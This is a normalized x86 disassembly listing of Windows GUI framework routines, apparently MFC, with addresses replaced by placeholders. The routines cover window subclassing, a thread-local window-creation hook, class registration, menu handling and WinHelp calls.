mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_425036
call sub_4221a7
push 0x48
mov ebx eax
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x1c
push r--data
call sub_42358d
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_4221a7
pop ebx
sub_41f3e7
push esi
push edi
push 0x1
call sub_41f375
mov esi eax
push [ esp + 0xc ]
mov ecx esi
call sub_4235f2
mov edi eax
push esi
mov ecx edi
call sub_421c5f
mov eax edi
pop edi
pop esi
retn 0x4
sub_41f42c
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push 0x1
call sub_41f375
mov edi eax
push ebx
mov [ esi + 0x1c ] ebx
lea ecx [ edi + 0x4 ]
call sub_41e529
push edi
mov ecx esi
mov [ eax ] esi
call sub_421c5f
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_41f465
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
and [ esi + 0x38 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41f375
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_41e579
sub_41f494
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push [ ebp + 0x8 ]
call sub_41f40e
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_41f226
push 0x1
pop eax
jmp r-xdata
pop ebp
retn 0x10
sub_41f4c9
mov eax sub_42aa58
call sub_410a78
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov [ ebp - 0x10 ] esp
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push 0x1
sub eax 0x6
pop ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_41f3e7
push edi
mov esi eax
call sub_41f3e7
push esi
push [ ebp + 0x10 ]
push eax
call sub_41f14f
sub eax 0x1a
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_41f3e7
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_41f1b0
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_41f3e7
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_41f0b3
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_41f0d6
sub_41f5ec
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
call sub_4229ff
mov edx [ eax ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx eax
push [ ebp - 0x20 ]
call [ edx + 0x6c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_423058
mov eax r-xdata
retn
sub_41f628
push ebp
mov ebp esp
push esi
push edi
push sub_4264ab
mov ecx rw-data
call sub_427941
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_41f4c9
cmp edi 0x135
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ edi - 0x132 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_420fe3
test eax eax
je r-xdata
cmp edi 0x136
je r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp edi 0x138
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
cmp edi 0x137
je r-xdata
cmp edi 0x134
jne r-xdata
sub_41f6a4
push ebp
mov ebp esp
sub esp 0x10
push sub_426477
mov ecx rw-data
call sub_4278ac
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ eax + 0x14 ]
push edi
mov edi [ ecx ]
call sub_4272f7
movzx eax [ eax + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x2c ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x23 ] 0x40
jne r-xdata
leave
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
mov esi [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_41f42c
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
cmp [ rw-data ] 0x0
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx eax
shr ecx 0x10
test cx cx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
push [ esi + 0x2c ]
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
call sub_41f4c3
mov esi eax
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x10 ] cl
lea eax [ ebp - 0x10 ]
push 0x5
push eax
mov ax [ edi + 0x28 ]
push eax
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
and [ esi + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
mov eax sub_41f628
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push 0x3
push [ esi + 0x2c ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x8 ] 0x0
mov edi eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov eax sub_41f4c9
push 0x0
push 0x0
push 0x36f
push ebx
push esi
call sub_41f226
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call sub_41f4c3
push 0xfffffffc
push ebx
mov [ ebp + 0x8 ] eax
call [ GetWindowLongA@IAT ]
push [ ebp - 0x10 ]
mov esi eax
sub esi [ ebp + 0x8 ]
push ebx
neg esi
sbb esi esi
inc esi
call [ edi + 0x20 ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
jmp r-xdata
sub_41f89a
push esi
push edi
push sub_426477
mov ecx rw-data
call sub_4278ac
mov esi eax
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_41f6a4
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
jne r-xdata
call sub_41dc26
sub_41f8e6
push esi
push sub_426477
mov ecx rw-data
call sub_4278ac
mov esi eax
call sub_4272f7
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
sub_41f928
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov esi ecx
mov [ ebp - 0x28 ] eax
call sub_4272f7
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
jne r-xdata
push edi
push esi
call sub_41f89a
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ CreateWindowExA@IAT ]
mov edi eax
call sub_41f8e6
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
xor eax eax
jmp r-xdata
xor eax eax
test edi edi
setne al
pop edi
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop esi
leave
retn 0x2c
sub_41fa0e
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
test eax eax
push edi
jne r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
sub eax esi
push edi
push eax
mov eax [ ebp + 0x10 ]
push edx
or eax 0x40000000
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_41f928
pop edi
pop esi
pop ebp
retn 0x1c
sub_41fa5a
mov eax sub_42aa6c
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_421d03
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ eax + 0x24 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x24 ] 0x0
cmp esi rw-data
je r-xdata
call sub_41fc17
sub_41fad6
push esi
mov esi ecx
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
and [ esi + 0x34 ] 0x0
mov ecx esi
call sub_41f34e
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_41faf4
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_4229ff
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x1c ] esi
jne r-xdata
mov ecx [ esi + 0x34 ]
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x30 ] ebx
cmp [ edi + 0x20 ] esi
jne r-xdata
call sub_4272f7
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x34 ] 0x0
test [ esi + 0x24 ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
call sub_4272f7
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push [ esi + 0x1c ]
call edi
mov ecx esi
mov ebx eax
call sub_41f34e
push 0xfffffffc
push [ esi + 0x1c ]
call edi
cmp eax ebx
jne r-xdata
call sub_4270c5
mov edi [ eax + 0xcc ]
test edi edi
je r-xdata
push ebx
call sub_429cc5
call sub_4261cb
test eax eax
je r-xdata
mov ecx esi
call sub_41f465
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_410a20
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] ebx
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_41fc17
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
push ebx
push edi
push 0x0
call sub_41f375
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_41e4f6
mov ecx [ esi + 0x38 ]
mov edi eax
test ecx ecx
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x50 ]
push [ esi + 0x1c ]
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx esi
call sub_41f465
test edi edi
mov ebx eax
jne r-xdata
sub_41fc64
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41fcce
push esi
call sub_4270c5
mov esi eax
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x108 ]
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
sub_41fd25
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x1c ]
call sub_424f1a
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
movzx eax ax
test esi esi
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x1c ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ah 0x20
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_41fd96
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_420ac6
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_423839
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_41f34e
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_41fdd3
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x8 ]
call sub_420ac6
test eax eax
je r-xdata
mov ecx esi
call sub_41f34e
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_41fe1d
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_41f34e
lea eax [ ebp + 0xc ]
push eax
call sub_420a99
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41fe48
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
xor eax eax
push edi
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_423824
test eax eax
je r-xdata
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
push [ esp + 0x14 ]
push eax
call sub_41fe48
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call sub_423839
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x8
jmp r-xdata
sub_41feab
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x1c ]
call sub_420936
test eax eax
je r-xdata
push sub_426477
mov ecx rw-data
call sub_4278ac
mov ecx [ edi + 0x1c ]
cmp [ eax + 0x50 ] ecx
jne r-xdata
mov ecx edi
call sub_41f34e
push 0x0
mov ecx eax
call sub_420a99
test eax eax
jne r-xdata
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x54 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
call sub_423824
push [ esi + 0x8 ]
push eax
call sub_41fe48
test eax eax
je r-xdata
sub_41ff23
mov eax sub_42aa78
call sub_410a78
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esp
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
push esi
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
call sub_4272f7
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_427d7a
mov [ ebp - 0x4 ] ebx
call sub_4272f7
push [ esi + 0x24 ]
mov esi [ lstrcatA@IAT ]
lea edi [ eax + 0x34 ]
push edi
call esi
lea eax [ ebp + 0xa ]
mov [ ebp + 0xa ] 0xa
push eax
push edi
mov [ ebp + 0xb ] bl
call esi
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_427dea
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_41ffb4
push 0x1
call sub_427dea
xor ebx ebx
push ebx
push ebx
call sub_410a97
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push sub_426477
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_4278ac
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0xc ]
sub eax 0x132
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x0
push 0x19
mov ecx esi
call [ eax + 0x98 ]
pop esi
leave
retn 0x8
sub_42000a
mov eax sub_42aa8c
call sub_410a78
push ecx
push ebx
push esi
mov esi ecx
call sub_4272f7
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
call sub_4272f7
mov ecx [ eax + 0x4 ]
call sub_421f55
mov eax [ esi ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_4209af
mov ecx esi
call sub_42089b
push ebx
mov esi eax
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_4209af
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x8c ]
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
test eax eax
pop edi
jne r-xdata
push ebx
push ebx
push 0x1f
push eax
call edi
or [ ebp - 0x4 ] 0xffffffff
call sub_4272f7
mov ecx [ eax + 0x4 ]
call sub_421f6a
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push 0xffffffff
push ebx
push 0xf107
call sub_42595e
sub_4200f2
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_420132
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x9c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xa0 ]
mov [ ebp - 0x4 ] eax
sub_420176
mov eax sub_42aab0
call sub_410a78
sub esp 0x54
and [ ebp - 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp ebx 0x111
mov edi ecx
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0x78 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_41f3e7
push eax
push [ ebp + 0xc ]
push edi
call sub_41f14f
mov edx [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0xc ]
mov ecx edi
call [ edx + 0x7c ]
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ebx eax
mov eax 0x1ff
and ebx eax
and ecx eax
push 0x7
xor ebx ecx
call sub_427d7a
mov ecx [ ebp + 0x8 ]
lea eax [ ebx + ebx * 2 ]
cmp ecx [ eax * 4 + rw-data ]
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
jne r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_41f1b0
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
mov [ ebx ] ecx
mov [ ebx + 0x8 ] eax
je r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
and [ ebx + 0x4 ] 0x0
push 0x7
call sub_427dea
jmp r-xdata
mov ebx [ ebx + 0x4 ]
push 0x7
mov [ ebp + 0x10 ] ebx
call sub_427dea
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov edx 0xc000
cmp ecx edx
jae r-xdata
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push 0x0
push edx
push eax
call sub_4200f2
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push ecx
push [ eax + 0x4 ]
call sub_4200f2
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx + 0x14 ]
cmp [ ecx + 0x8 ] 0x1a
mov eax [ ecx + 0x10 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
jmp r-xdata
push 0x7
mov [ ebx + 0x4 ] eax
call sub_427dea
mov ebx [ ebp + 0x10 ]
jmp r-xdata
dec eax
cmp eax 0x30
ja r-xdata
call [ GetVersion@IAT ]
mov ecx [ ebp + 0x10 ]
cmp al 0x4
sbb eax eax
and al 0xf0
add eax 0x2f
mov ebx [ ebx + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ecx ] edx
je r-xdata
jmp [ eax * 4 + jump_table_420624 ]
push 0x7
mov [ ebx + 0x4 ] eax
call sub_427dea
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x0
add eax 0x18
push 0xc000
push eax
call sub_4200f2
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
push [ ebp + 0xc ]
call sub_42464e
push eax
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_41f3e7
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_41f3e7
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_4245ac
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
call sub_41efc6
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] eax
call sub_41f40e
test eax eax
jne r-xdata
lea ecx [ ebp - 0x24 ]
call sub_4245ac
mov eax [ esi + 0x4 ]
